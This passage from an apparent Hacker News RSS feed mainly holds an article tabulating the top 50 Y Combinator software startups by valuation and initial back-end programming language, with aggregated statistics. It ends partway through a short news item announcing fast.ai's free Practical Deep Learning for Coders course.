	</div></div>]]>
            </description>
            <link>https://teamhydra.blog/2020/08/25/bypassing-credential-guard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24279792</guid>
            <pubDate>Wed, 26 Aug 2020 06:38:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[YC Software Startups: Value and Initial Programming Language Used]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 63 (<a href="https://news.ycombinator.com/item?id=24279611">thread link</a>) | @charliereese
<br/>
August 25, 2020 | https://charliereese.ca/article/top-50-y-combinator-tech-startups | <a href="https://web.archive.org/web/*/https://charliereese.ca/article/top-50-y-combinator-tech-startups">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

			<div>

				<p>This article contains a list of the top 50 YC software startups (sourced from the October 2019 <a href="https://www.ycombinator.com/topcompanies/">YC Top Companies</a> page). It also contains aggregated statistics for valuations and back-end programming languages used.</p>
<p>Values in this article are sourced, but I cannot guarantee their accuracy.</p>
<p>Follow me on Twitter <a href="https://twitter.com/charlieinthe6">@charlieinthe6</a> for similar content. <a href="https://news.ycombinator.com/item?id=24279611">View article comments on HackerNews</a>.</p>
<p>☕</p>
<p><strong>Table of Contents:</strong></p>
<ol>
<li><a href="#top-50">Top 50 Software Startups</a></li>
<li><a href="#stats">Aggregated Stats</a></li>
</ol>
<h3 id="top-50">1. Top 50 Software Startups:</h3>
<table>
<thead>
<tr>
<th>Company</th>
<th>Latest val ($MM)</th>
<th>Initial back-end language(s)</th>
<th>DataSci / LowLv</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://stripe.com/">Stripe</a>: <br>Payment / economic infrastructure for internet</td>
<td>36,000 <small> <a href="https://detroit.cbslocal.com/2020/08/11/general-motors-cfo-exits-suddenly-for-silicon-valley/">source</a> </small></td>
<td>Ruby <small> <a href="https://qr.ae/pN2pJk">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://getcruise.com/">Cruise</a>: <br>Building self-driving car tech</td>
<td>19,000 <small> <a href="https://www.thedrive.com/tech/27872/gm-cruise-divisions-new-1b-investment-sets-valuation-at-staggering-19b">source</a> </small></td>
<td>C++, Python <small> <a href="https://angel.co/company/cruise-automation/jobs/757823-staff-deep-learning-optimization-engineer">source</a>, <a href="https://angel.co/company/cruise-automation/jobs/841627-staff-software-engineer-c-frameworks">source</a> </small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://airbnb.com/">Airbnb</a>: <br>Marketplace to rent someone’s room</td>
<td>18,000 <small> <a href="https://sanfrancisco.cbslocal.com/2020/08/11/airbnb-ipo-reportedly-close-to-filing-wsj/">source</a> </small></td>
<td>Ruby <small> <a href="https://www.forbes.com/sites/quora/2018/02/20/what-technology-stack-does-airbnb-use/#448ff4184025">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://doordash.com/">DoorDash</a>: <br>Food delivery</td>
<td>16,000 <small> <a href="https://www.cnn.com/2020/06/18/tech/doordash-funding-valuation/index.html">source</a> </small></td>
<td>Python <small> <a href="https://medium.com/@DoorDash/implementing-rest-apis-with-embedded-privacy-a2394dc4dceb">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://twitch.tv/">Twitch</a>: <br>Gaming video platform / community</td>
<td>15,000 <small> <a href="https://www.cnbc.com/2020/06/16/amazon-media-assets-worth-500-billion-almost-as-much-as-aws-needham.html#:~:text=To%20get%20to%20%24500%20billion,business%20is%20at%20%243.8%20billion.">source</a> </small></td>
<td>C++, Ruby <small> <a href="https://blog.twitch.tv/en/2015/12/18/twitch-engineering-an-introduction-and-overview-a23917b71a25/">source</a> (founded before Go)</small></td>
<td>N / Y</td>
</tr>
<tr>
<td><a href="https://instacart.com/">Instacart</a>: <br>Grocery pick-up / delivery</td>
<td>13,700 <small> <a href="https://techcrunch.com/2020/06/11/instacart-raises-225-million-at-13-7-billion-valuation/">source</a> </small></td>
<td>Ruby <small> <a href="https://stackshare.io/posts/the-tech-behind-instacarts-grocery-delivery-service">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://dropbox.com/">Dropbox</a>: <br>File hosting / syncing</td>
<td>8000 (market cap @ Aug 2020) <small> <a href="https://finance.yahoo.com/quote/DBX?p=DBX">source</a> </small></td>
<td>Python <small> <a href="https://eranki.tumblr.com/post/27076431887/scaling-lessons-learned-at-dropbox-part-1">source</a> </small></td>
<td>N / Y</td>
</tr>
<tr>
<td><a href="https://coinbase.com/">Coinbase</a>: <br>Cryptocurrency exchange</td>
<td>8,000 <small> <a href="https://www.coindesk.com/coinbase-existing-valuation-doesnt-need-ipo-lawyer-says">source</a> </small></td>
<td>Ruby <small> <a href="https://blog.coinbase.com/scaling-connections-with-ruby-and-mongodb-99204dbf8857">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://gusto.com/">Gusto</a>: <br>Employee payroll and benefits</td>
<td>3,800 <small> <a href="https://www.forbes.com/sites/donnafuscaldo/2019/07/24/gusto-amasses-3-8-billion-valuation-with-latest-fundraising-round/#50e7fa8d2820">source</a> </small></td>
<td>Ruby <small> <a href="https://boards.greenhouse.io/gusto/jobs/1337386?t=bae6d7cd1">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://rappi.com/">Rappi</a>: <br>On-demand delivery</td>
<td>3,500 <small> <a href="https://techcrunch.com/2020/04/08/ifood-merges-with-delivery-heros-domicilios-com-to-challenge-rappi-in-colombia/">source</a> </small></td>
<td>Go, Node, Python, Java <small> <a href="https://www.rappi.com/jobs/position-detail?id=b88ad33f-7ad5-4e3b-8ecb-f13a3cce3a6a&amp;lang=lang">source</a> (may have used PHP - no source)</small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://flexport.com/">Flexport</a>: <br>Freight forwarding platform</td>
<td>3,200 <small> <a href="https://www.joc.com/technology/wework-spanner-flexports-works_20191021.html">source</a> </small></td>
<td>Ruby <small> <a href="https://stackshare.io/posts/how-flexport-builds-software-to-move-over-1-billion-dollars-in-merchandise">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://reddit.com/">Reddit</a>: <br>Online network of communities</td>
<td>3,000 <small> <a href="https://techcrunch.com/2019/02/11/reddit-300-million/">source</a> </small></td>
<td>Lisp <small> <a href="http://www.aaronsw.com/weblog/rewritingreddit">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://about.gitlab.com/">GitLab</a>: <br>DevOps platform</td>
<td>2,750 <small> <a href="https://www.forbes.com/sites/alexkonrad/2019/09/17/gitlab-doubles-valuation-to-nearly-3-billion/#483591ce1794">source</a> </small></td>
<td>Ruby <small> <a href="https://about.gitlab.com/blog/2018/10/29/why-we-use-rails-to-build-gitlab/">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://brex.com/">Brex</a>: <br>Corporate credit cards</td>
<td>2,750 <small> <a href="https://techcrunch.com/2020/05/19/brex-brings-on-150m-in-new-cash-in-case-of-an-extended-recession/">source</a> </small></td>
<td>Elixir <small> <a href="https://medium.com/brexeng/why-brex-chose-elixir-fe1a4f313195">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://pagerduty.com/">PargerDuty</a>: <br>SaaS incident response platform</td>
<td>2,270 <small> <a href="https://www.google.com/search?tbm=fin&amp;q=NYSE:+PD&amp;stick=H4sIAAAAAAAAAONgecRowS3w8sc9YSn9SWtOXmPU5OIKzsgvd80rySypFJLmYoOyBKX4uXj10_UNDdOyCwszkotLeBaxcvhFBrtaKQS4AAASRGHASAAAAA&amp;sa=X&amp;ved=2ahUKEwjCtra68ZbrAhUYXc0KHdn_DoAQ3ecFMAB6BAhqEBc&amp;biw=1278&amp;bih=968#scso=_Z4c0X5TmCsjOtQbEu5zQAQ1:0">source</a> </small></td>
<td>Ruby <small> <a href="https://www.pagerduty.com/blog/elixir-at-pagerduty/">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://checkr.com/">Checkr</a>: <br>Background checks</td>
<td>2,200 <small> <a href="https://www.forbes.com/sites/bizcarson/2019/09/19/checkr-background-funding-round/#552c8c845460">source</a> </small></td>
<td>Ruby <small> <a href="https://engineering.checkr.com/yet-another-attempt-at-faster-builds-caching-db-schema-efe63d367f5">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://podium.com/">Podium</a>: <br>Interaction management platform</td>
<td>1,500 <small> <a href="https://techcrunch.com/2020/04/07/utahs-podium-raises-125m-series-c-led-by-yc-after-reaching-100m-arr/">source</a> </small></td>
<td>Ruby <small> <a href="https://devchat.tv/elixir-mix/emx-072-people-centered-solutions-with-travis-elnicky/">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://segment.com/">Segment</a>: <br>Customer data platform</td>
<td>1,500 <small> <a href="https://www.bloomberg.com/news/articles/2019-04-02/startup-segment-is-worth-1-5-billion-thanks-to-companies-troves-of-customer-data">source</a> </small></td>
<td>Go, JS <small> <a href="https://www.workatastartup.com/companies/88">source</a>, <a href="https://angel.co/company/segment/jobs/348613-senior-software-engineer">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://docker.com/">Docker</a>: <br>Build / deliver software in containers</td>
<td>1000 est. <small> <a href="https://techcrunch.com/2019/11/13/mirantis-acquires-docker-enterprise/">source</a>, <a href="https://techcrunch.com/2018/10/15/docker-has-raised-92-million-in-new-funding/">source</a> </small></td>
<td>Go <small> <a href="https://thenewstack.io/go-programming-language-helps-docker-container-ecosystem/">source</a>, <a href="https://techcrunch.com/2019/11/13/after-selling-enterprise-biz-docker-lands-35m-investment-and-new-ceo/">source</a> </small></td>
<td>N / Y</td>
</tr>
<tr>
<td><a href="https://scale.com/">Scale</a>: <br>Training / validation data for ML</td>
<td>1,000 <small> <a href="https://www.forbes.com/sites/stevenli1/2019/12/22/scale-ai-growth-story/#3360214b6f4a">source</a> </small></td>
<td>Python, JS <small> <a href="https://scale.com/careers/41e05b90-7e65-4dac-8676-50be9c1afc27">source</a>, <a href="https://scale.com/careers/37b0c485-cd77-4170-ac07-a8521b9a10fc">source</a> </small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://amplitude.com/">Amplitude</a>: <br>Product / customer analytics</td>
<td>1,000 <small> <a href="https://www.forbes.com/sites/davidjeans/2020/05/20/amplitude-now-valued-1-billion-backed-sequoia-benchmark/#68a1ad2041c7">source</a> </small></td>
<td>Python, Java <small> <a href="https://news.ycombinator.com/item?id=13301832&amp;p=2">source</a> </small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://zapier.com/">Zapier</a>: <br>Connect apps and automate workflows</td>
<td>1000 est. (20x 2018 ARR) <small> <a href="https://www.drift.com/blog/how-zapier-grew/">source</a> </small></td>
<td>Python <small> <a href="https://zapier.com/blog/zapier-tech-stack/">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://faire.com/">Faire</a>: <br>B2B wholesale marketplace</td>
<td>1,000 <small> <a href="https://www.forbes.com/sites/laurendebter/2019/10/30/faire-wholesale-marketplace-series-d-1-billion-valuation/#21c2bdfb7aa9">source</a> </small></td>
<td>Java <small> <a href="https://boards.greenhouse.io/faire/jobs/4187498002">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://plangrid.com/">PlanGrid</a>: <br>Construction software</td>
<td>875 <small> <a href="https://techcrunch.com/2018/11/20/autodesk-agrees-to-buy-plangrid-for-875-million/#:~:text=Autodesk%20announced%20plans%20to%20acquire%20PlanGrid%20for%20%24875%20million%20today.">source</a> </small></td>
<td>Python <small> <a href="https://stackoverflow.com/jobs/companies/plangrid">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://mixpanel.com/">Mixpanel</a>: <br>User analytics</td>
<td>865 <small> <a href="https://www.forbes.com/pictures/feki45efhmk/mixpanel/#71dc3892190f">source</a> </small></td>
<td>Python<small> <a href="https://boards.greenhouse.io/mixpanel/jobs/1545756?gh_jid=1545756">source</a> (founded before Go)</small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://benchling.com/">Benchling</a>: <br>Biotech research</td>
<td>850 <small> <a href="https://www.forbes.com/sites/amyfeldman/2020/05/28/biotech-rd-software-startup-benchling-started-by-mit-undergrads-scores-850-million-valuation-amid-coronavirus-pandemic/#5de0e0c61dcd">source</a> </small></td>
<td>Python <small> <a href="https://www.workatastartup.com/companies/445">source</a> </small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://meesho.com/">Meesho</a>: <br>Social commerce platform</td>
<td>700 <small> <a href="https://economictimes.indiatimes.com/small-biz/startups/newsbuzz/meesho-raised-125-mn-from-naspers-and-others/articleshow/70641492.cms">source</a> </small></td>
<td>Java <small> <a href="https://angel.co/company/meesho/jobs/596045-software-development-engineer-iii">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://optimizely.com/">Optimizely</a>: <br>Digital experience optimization / testing</td>
<td>600 <small> <a href="https://pitchbook.com/newsletter/optimizely-brings-in-50m#:~:text=Optimizely%2C%20which%20operates%20an%20optimization,with%20participation%20from%20Accenture%20Ventures">source</a> </small></td>
<td>Python <small> <a href="https://news.ycombinator.com/item?id=2647003">source</a> </small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://algolia.com/">Algolia</a>: <br>Search service</td>
<td>578 <small> <a href="https://www.bizjournals.com/sanfrancisco/news/2019/10/15/fast-growing-san-francisco-search-company-scores.html">source</a> </small></td>
<td>C++, Ruby <small> <a href="https://www.algolia.com/doc/faq/why/what-architecture-does-algolia-use-to-provide-an-high-performance-search-engine/">source</a>, <a href="https://stackshare.io/posts/how-algolia-built-their-realtime-search-as-a-service-product">source</a> </small></td>
<td>N / Y</td>
</tr>
<tr>
<td><a href="https://goat.com/">Goat</a>: <br>Sneaker marketplace</td>
<td>550 <small> <a href="https://www.forbes.com/sites/kurtbadenhausen/2019/02/07/foot-locker-invests-100-million-in-secondary-sneaker-firm-goat/#3b07b65e568d">source</a> </small></td>
<td>Ruby <small> <a href="https://www.workatastartup.com/jobs/20990">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://standard.ai/">StandardCognition</a>: <br>Autonomous checkout</td>
<td>535 <small> <a href="https://techcrunch.com/2019/07/25/standard-cognition-lands-35m-at-535m-valuation-to-battle-amazon-go/">source</a> </small></td>
<td>Python <small> <a href="https://jobs.lever.co/standard/9b874041-7cfe-4e0a-a459-fcd66451ee75">source</a> </small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://people.ai/">People.ai</a>: <br>Intelligent CRM</td>
<td>500 <small> <a href="https://techcrunch.com/2019/05/21/people-ai-the-predictive-sales-startup-raises-60m-at-around-500m-valuation/#:~:text=People.ai%2C%20the%20predictive%20sales,around%20%24500M%20valuation%20%7C%20TechCrunch">source</a> </small></td>
<td>Python <small> <a href="https://www.workatastartup.com/companies/1299">source</a>, <a href="https://news.ycombinator.com/item?id=16974829">source</a> </small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://razorpay.com/">Razorpay</a>: <br>Digital payments</td>
<td>450 <small> <a href="https://www.pymnts.com/news/investment-tracker/2019/razorpay-sequoia-india-ribbit-capital/#:~:text=With%20the%20funding%2C%20Razorpay%20is,Razorpay%20X%20neo%2Dbanking%20platform.">source</a> </small></td>
<td>PHP <small> <a href="https://news.ycombinator.com/item?id=12407955">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://equipmentshare.com/">EquipmentShare</a>: <br>Equipment rentals</td>
<td>400 est. <small> <a href="https://www.forbes.com/sites/alexkonrad/2019/11/18/softbank-looks-to-invest-equipmentshare-unicorn/#48a6b2d779b8">source</a> </small></td>
<td>Python <small> <a href="https://news.ycombinator.com/item?id=16492994&amp;p=2">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://weebly.com/">Weebly</a>: <br>Website builder</td>
<td>365 <small> <a href="https://techcrunch.com/2018/04/26/square-acquires-weebly/">source</a> </small></td>
<td>PHP <small> <a href="https://news.ycombinator.com/item?id=2839742">source</a>, <a href="https://news.ycombinator.com/item?id=5729035">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://webflow.com/">Webflow</a>: <br>Website builder</td>
<td>350 <small> <a href="https://growthhackers.com/articles/how-webflow-quietly-grew-without-vc-money?r=latest">source</a> </small></td>
<td>JS <small> <a href="https://boards.greenhouse.io/webflow/jobs/1838218">source</a>, <a href="https://www.workatastartup.com/companies/566">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://matterport.com/">Matterport</a>: <br>3D technology platform</td>
<td>325 <small> <a href="https://techcrunch.com/2019/03/05/matterport-2/#:~:text=Matterport%20had%20raised%20just%20under,DCM%2C%20Qualcomm%20Ventures%20and%20more.">source</a> </small></td>
<td>C++ <small> <a href="https://news.ycombinator.com/item?id=3300290">source</a>, <a href="https://news.ycombinator.com/item?id=5186626">source</a> </small></td>
<td>N / Y</td>
</tr>
<tr>
<td><a href="https://influxdata.com/">InfluxData</a>: <br>InfluxDB creator</td>
<td>300 est. <small> <a href="https://www.crunchbase.com/organization/influxdb/company_financials">source</a> </small></td>
<td>Go <small> <a href="https://github.com/influxdata/influxdb">source</a> </small></td>
<td>N / Y</td>
</tr>
<tr>
<td><a href="https://embarktrucks.com/">Embark</a>: <br>Self-driving trucks</td>
<td>300 est. <small> <a href="https://www.crunchbase.com/organization/embark-trucks/company_financials">source</a> </small></td>
<td>Python, C++ <small> <a href="https://jobs.lever.co/embark/25999d12-5d82-45fc-b3e4-0ebc335f6f59">source</a> </small></td>
<td>Y / Y</td>
</tr>
<tr>
<td><a href="https://sendbird.com/">SendBird</a>: <br>Chat / calls as a service</td>
<td>300 est. <small> <a href="https://www.crunchbase.com/organization/sendbird/company_financials">source</a> </small></td>
<td>Python <small> <a href="https://sendbird.com/careers/4317963002">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://rescale.com/">Rescale</a>: <br>Cloud simulation platform</td>
<td>300 est. <small> <a href="https://www.crunchbase.com/organization/rescale/company_financials">source</a> </small></td>
<td>Java, Python <small> <a href="https://news.ycombinator.com/item?id=5828217">source</a> </small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://gocardless.com/">GoCardless</a>: <br>Direct debit payments</td>
<td>300 est. <small> <a href="https://www.crunchbase.com/organization/gocardless/company_financials">source</a> </small></td>
<td>Ruby <small> <a href="https://news.ycombinator.com/item?id=14978103">source</a>, <a href="https://news.ycombinator.com/item?id=16283469">source</a>, <a href="https://news.ycombinator.com/item?id=4596703">source</a>, <a href="https://boards.greenhouse.io/gocardless/jobs/2282283">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://rigetti.com/">Rigetti Computing</a>: <br>Quantum computing</td>
<td>300 est. <small> <a href="https://www.crunchbase.com/organization/rigetti-computing/company_financials">source</a> </small></td>
<td>Python, Lisp, C <small> <a href="https://news.ycombinator.com/item?id=16968407">source</a> </small></td>
<td>Y / Y</td>
</tr>
<tr>
<td><a href="https://messagebird.com/">MessageBird</a>: <br>Omnichannel customer communication</td>
<td>300 <small> <a href="https://www.fool.com/investing/2020/03/13/twilio-investors-keep-tabs-on-startup-messagebird.aspx">source</a> </small></td>
<td>Go, PHP, Python, Java <small> <a href="https://careers.sh/uk/kompaniya/messagebird/robochi-mistsya/71009">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://ironcladapp.com/">Ironclad</a>: <br>Digital contracting platform</td>
<td>300 est. <small> <a href="https://www.crunchbase.com/organization/ironclad/company_financials">source</a> </small></td>
<td>JS, Java <small> <a href="https://jobs.lever.co/ironcladapp/2d6616e3-27b8-4138-a6fc-238e46757822">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://sift.com/">Sift</a>: <br>Digital safety and fraud detection</td>
<td>300 est. <small> <a href="https://www.crunchbase.com/organization/sift-science/company_financials">source</a> </small></td>
<td>Java, Ruby <small> <a href="https://news.ycombinator.com/item?id=6657091">source</a> </small></td>
<td>Y / N</td>
</tr>
<tr>
<td><a href="https://mattermost.com/">Mattermost</a>: <br>Open source Slack alternative</td>
<td>250 est. <small> <a href="https://app.dealroom.co/companies/mattermost">source</a> </small></td>
<td>Go <small> <a href="https://github.com/mattermost/mattermost-server">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://xendit.co/">Xendit</a>: <br>Digital payments</td>
<td>150 est. <small> <a href="https://www.ycombinator.com/topcompanies/">source</a> </small></td>
<td>JS <small> <a href="https://www.workatastartup.com/companies/938">source</a>, <a href="https://www.xendit.co/en/careers/job-application/?gh_jid=4114942003">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://easypost.com/">EasyPost</a>: <br>Logistics software</td>
<td>150 est. <small> <a href="https://www.ycombinator.com/topcompanies/">source</a> </small></td>
<td>Ruby <small> <a href="https://news.ycombinator.com/item?id=6231587">source</a>, <a href="https://news.ycombinator.com/item?id=13542390">source</a>, <a href="https://www.linkedin.com/jobs/view/senior-software-engineer-at-easypost-1669977835/">source</a> </small></td>
<td>N / N</td>
</tr>
<tr>
<td><a href="https://newfrontinsurance.com/">Newfront</a>: <br>Insurance platform</td>
<td>150 est. <small> <a href="https://www.ycombinator.com/topcompanies/">source</a> </small></td>
<td>JS, Go <small> <a href="https://www.keyvalues.com/newfront">source</a>, <a href="https://news.ycombinator.com/item?id=21683554">source</a> </small></td>
<td>N / N</td>
</tr>
</tbody>
</table>
<p><small>
<p>Note: Ginkgo Bioworks, Boom Supersonic, Grin, Memebox, Helion Energy, North, RelativitySpace, and The Athletic were excluded from the below list; I didn't feel they were primarily software businesses. Feel free to disagree with my judgement.</p>
<p>Note: values current as of August 15, 2020.</p>
<p>Note: if one language was the primary language used to build the initial product, one language is listed above. If it was not clear which language was primary, multiple languages are listed above.</p>
<p>Note: if I couldn't find which language was used to build the startup initially, I referenced the oldest job posting I could find.</p>
<p>Note: valuations are approximate and predominantly sourced from recent articles online. Where I couldn't find an indication of value, ~$150M is assumed; startups listed above were all worth +$150M as of October 2019, as per the <a href="https://www.ycombinator.com/topcompanies/">YC Top Companies</a> page.</p>
<p>Note: "Y" and "N" values in the "DataSci / LowLv" column describe a startup's primary product (i.e. ML startups would have a "Y" for DataSci). It was included to provide additional colour on why initial back-end language(s) may have been used / selected. The values in this column are based entirely on my own judgement. Feel free to disagree with them or ignore them.</p>
<p>Note: Ruby and ruby on rails was a popular choice for YC startups around 2010 - 2012. Anecdotally, ~40% of YC startups used ruby during its peak popularity.</p>
</small></p>

<h3 id="stats">2. Aggregated Stats:</h3>

<p><strong>Startups with one (initial) primary back-end language:</strong> </p>
<table>
<thead>
<tr>
<th>Language</th>
<th>Count</th>
<th>Total Valuation ($BN)</th>
</tr>
</thead>
<tbody>
<tr>
<td>All</td>
<td>35 (70%)</td>
<td>132.1 (75%)</td>
</tr>
<tr>
<td>Ruby</td>
<td>13 (26%)</td>
<td>92.4 (52%)</td>
</tr>
<tr>
<td>Python</td>
<td>11 (22%)</td>
<td>29.9 (17%)</td>
</tr>
<tr>
<td>Lisp</td>
<td>1 (2%)</td>
<td>3.0 (2%)</td>
</tr>
<tr>
<td>Elixir</td>
<td>1 (2%)</td>
<td>2.8 (2%)</td>
</tr>
<tr>
<td>Java</td>
<td>2 (4%)</td>
<td>1.7 (1%)</td>
</tr>
<tr>
<td>Go</td>
<td>3 (6%)</td>
<td>1.6 (1%)</td>
</tr>
<tr>
<td>PHP</td>
<td>2 (4%)</td>
<td>0.8 (0%)</td>
</tr>
<tr>
<td>JS</td>
<td>2 (4%)</td>
<td>0.5 (0%)</td>
</tr>
<tr>
<td>C++</td>
<td>1 (2%)</td>
<td>0.3 (0%)</td>
</tr>
</tbody>
</table>

<p><strong>Startups with multiple (initial) primary back-end languages:</strong> </p>
<table>
<thead>
<tr>
<th>Language</th>
<th>Count</th>
<th>Total Valuation ($BN)</th>
</tr>
</thead>
<tbody>
<tr>
<td>All</td>
<td>15 (30%)</td>
<td>44.4 (25%)</td>
</tr>
<tr>
<td>C++ is one</td>
<td>4 (8%)</td>
<td>34.9 (20%)</td>
</tr>
<tr>
<td>Python is one</td>
<td>8 (16%)</td>
<td>25.7 (15%)</td>
</tr>
<tr>
<td>Ruby is one</td>
<td>3 (6%)</td>
<td>15.9 (9%)</td>
</tr>
<tr>
<td>JS is one</td>
<td>5 (10%)</td>
<td>6.5 (4%)</td>
</tr>
<tr>
<td>Java is one</td>
<td>6 (12%)</td>
<td>5.7 (3%)</td>
</tr>
<tr>
<td>Go is one</td>
<td>4 (8%)</td>
<td>5.5 (3%)</td>
</tr>
<tr>
<td>Lisp is one</td>
<td>1 (2%)</td>
<td>0.3 (0%)</td>
</tr>
<tr>
<td>C is one</td>
<td>1 (2%)</td>
<td>0.3 (0%)</td>
</tr>
<tr>
<td>PHP is one</td>
<td>1 (2%)</td>
<td>0.3 (0%)</td>
</tr>
</tbody>
</table>
<p><small>Note: "Startups with multiple (initial) primary back-end languages" table doesn't add to 100% because multiple languages were used for startups.</small></p>

<p><strong>All startups:</strong> </p>
<table>
<thead>
<tr>
<th>Language</th>
<th>Count</th>
<th>Total Valuation ($BN)</th>
</tr>
</thead>
<tbody>
<tr>
<td>All</td>
<td>50 (100%)</td>
<td>176.5 (100%)</td>
</tr>
<tr>
<td>Ruby is one</td>
<td>16 (32%)</td>
<td>108.3 (61%)</td>
</tr>
<tr>
<td>Python is one</td>
<td>19 (38%)</td>
<td>55.6 (32%)</td>
</tr>
<tr>
<td>C++ is one</td>
<td>5 (10%)</td>
<td>35.2 (20%)</td>
</tr>
<tr>
<td>Java is one</td>
<td>8 (16%)</td>
<td>7.4 (4%)</td>
</tr>
<tr>
<td>Go is one</td>
<td>7 (14%)</td>
<td>7.0 (4%)</td>
</tr>
<tr>
<td>JS is one</td>
<td>7 (14%)</td>
<td>7.0 (4%)</td>
</tr>
<tr>
<td>Lisp is one</td>
<td>2 (4%)</td>
<td>3.3 (2%)</td>
</tr>
<tr>
<td>Elixir is one</td>
<td>1 (2%)</td>
<td>2.8 (2%)</td>
</tr>
<tr>
<td>PHP is one</td>
<td>3 (6%)</td>
<td>1.1 (1%)</td>
</tr>
<tr>
<td>C is one</td>
<td>1 (2%)</td>
<td>0.3 (0%)</td>
</tr>
</tbody>
</table>
<p><small>Note: "All startups" table doesn't add to 100% because multiple languages were used for some startups.</small></p>
				
			</div>

		</article></div>]]>
            </description>
            <link>https://charliereese.ca/article/top-50-y-combinator-tech-startups</link>
            <guid isPermaLink="false">hacker-news-small-sites-24279611</guid>
            <pubDate>Wed, 26 Aug 2020 06:03:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fast.ai Released a New Free Deep Learning Course]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24279146">thread link</a>) | @yadavrohit
<br/>
August 25, 2020 | https://www.analyticsdrift.com/a-new-free-deep-learning-course-by-fast-ai/ | <a href="https://web.archive.org/web/*/https://www.analyticsdrift.com/a-new-free-deep-learning-course-by-fast-ai/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                    <!-- .entry-header -->

                
                        <div>
                                    <p><img width="740" height="474" src="https://i0.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/deep-learning-courses-online.jpg?fit=740%2C474&amp;ssl=1&amp;is-pending-load=1" alt="deep learning course" loading="lazy" data-lazy-srcset="https://i0.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/deep-learning-courses-online.jpg?w=740&amp;ssl=1 740w, https://i0.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/deep-learning-courses-online.jpg?resize=300%2C192&amp;ssl=1 300w" data-lazy-sizes="(max-width: 740px) 100vw, 740px" data-lazy-src="https://i0.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/deep-learning-courses-online.jpg?fit=740%2C474&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">                </p>
            
                                            </div>

            

        <!-- end slider-section -->
                                    

    <div>
        <div>
            
<p>fast.ai — an independent research center that makes superior solutions for easy accessibility of deep learning — has released a free course, along with the book. The course — <a href="https://course.fast.ai/videos/?lesson=1" target="_blank" rel="noreferrer noopener">Practical Deep Learning for Coders</a> — is aimed at the introduction to machine learning and deep learning, and production and deployment of models.</p>



<p>Practical Deep Learning Course by fast.ai covers the material from the book <a href="https://www.amazon.com/Deep-Learning-Coders-fastai-PyTorch/dp/1492045527" target="_blank" rel="noreferrer noopener">PyTorch: AI Applications Without a PhD</a>. Every video lesson covers one chapter of the book that is also freely available if you do not want to purchase it from Amazon. PyTorch: AI Applications Without a PhD. is hosted on GitHub, where you can access the book in a freely available interactive <a href="https://github.com/fastai/fastbook" target="_blank" rel="noreferrer noopener">Jupyter Notebooks</a>.</p>



<p><strong>Also Read:</strong> <a href="https://www.analyticsdrift.com/amazon-makes-its-machine-learning-course-free-for-all/" target="_blank" rel="noreferrer noopener">Amazon Makes Its Machine Learning Course Free For All</a></p>



<p>However, the entire book is not covered in this Practical Deep Learning for Coders course. In the future, fast.ai will release the second part of the course that will complete the book’s remaining lessons.</p>



<p>Unlike most of the free courses and short-term courses, this deep learning course by fast.ai covers an end-to-end data science workflow as it also provides lessons on the deployment of models and data ethics. This makes it a must for aspirants who want to learn advanced techniques and make themselves relevant to the industry.</p>



<p><strong>What you will learn:</strong></p>



